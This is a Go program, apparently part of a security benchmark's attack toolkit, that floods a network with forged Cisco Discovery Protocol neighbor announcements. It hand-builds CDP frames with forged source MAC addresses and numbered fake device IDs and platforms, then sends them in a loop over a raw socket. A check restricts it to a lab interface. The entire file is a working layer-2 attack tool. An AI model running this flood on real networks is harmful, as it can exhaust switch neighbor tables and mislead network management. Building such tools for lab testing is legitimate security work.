package main

import (
	"encoding/binary"
	"fmt"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	cdpVersion = 2
	cdpTTL     = 180
)

func appendTLV(payload []byte, typ uint16, value []byte) ([]byte, error) {
	if len(value) > 0xffff-4 {
		return nil, fmt.Errorf("CDP TLV %#04x value is too long: %d bytes", typ, len(value))
	}
	tlvLen := 4 + len(value)
	tlv := make([]byte, tlvLen)
	binary.BigEndian.PutUint16(tlv[0:2], typ)
	binary.BigEndian.PutUint16(tlv[2:4], uint16(tlvLen))
	copy(tlv[4:], value)
	return append(payload, tlv...), nil
}

// buildCDP mirrors cdp_flood.build_cdp and the supplied Scapy CDP source:
// Dot3 / LLC(AA AA 03) / SNAP(OUI 00000c, code 2000) / CDPv2_HDR / TLVs.
func buildCDP(deviceID, platform string, n int) ([]byte, error) {
	payload := []byte{cdpVersion, cdpTTL, 0, 0}
	var err error
	payload, err = appendTLV(payload, 0x0001, []byte(fmt.Sprintf("%s-%d", deviceID, n))) // Device ID
	if err != nil {
		return nil, err
	}
	payload, err = appendTLV(payload, 0x0003, []byte("eth1")) // Port ID
	if err != nil {
		return nil, err
	}
	payload, err = appendTLV(payload, 0x0006, []byte(platform)) // Platform
	if err != nil {
		return nil, err
	}
	payload, err = appendTLV(payload, 0x0004, []byte{0, 0, 0, 0x28}) // Capabilities
	if err != nil {
		return nil, err
	}
	binary.BigEndian.PutUint16(payload[2:4], attackcommon.CDPChecksum(payload))

	srcMAC := attackcommon.ForgedMAC()
	llcSnapCDP := 3 + 5 + len(payload)
	if llcSnapCDP > 0xffff {
		return nil, fmt.Errorf("CDP frame payload is too long: %d bytes", llcSnapCDP)
	}
	frame := make([]byte, 14+llcSnapCDP)
	copy(frame[0:6], []byte{0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc})
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(llcSnapCDP)) // Dot3 length

	frame[14] = 0xaa // LLC DSAP
	frame[15] = 0xaa // LLC SSAP
	frame[16] = 0x03 // LLC control
	frame[17] = 0x00 // SNAP OUI, 00 00 0c
	frame[18] = 0x00
	frame[19] = 0x0c
	binary.BigEndian.PutUint16(frame[20:22], 0x2000) // SNAP code
	copy(frame[22:], payload)
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("Flood forged CDP neighbor announcements")
	deviceID := fs.String("device_id", "fake-switch", "")
	platform := fs.String("platform", "cisco WS-C2960X", "")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	frame, err := buildCDP(*deviceID, *platform, 0)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("CDP packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("cdp_flood", fmt.Sprintf("CDP frame len=%d", len(frame)))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildCDP(*deviceID, *platform, n)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send CDP frame: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("CDP #%d device-id=%s-%d platform='%s'", n+1, *deviceID, n, *platform))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
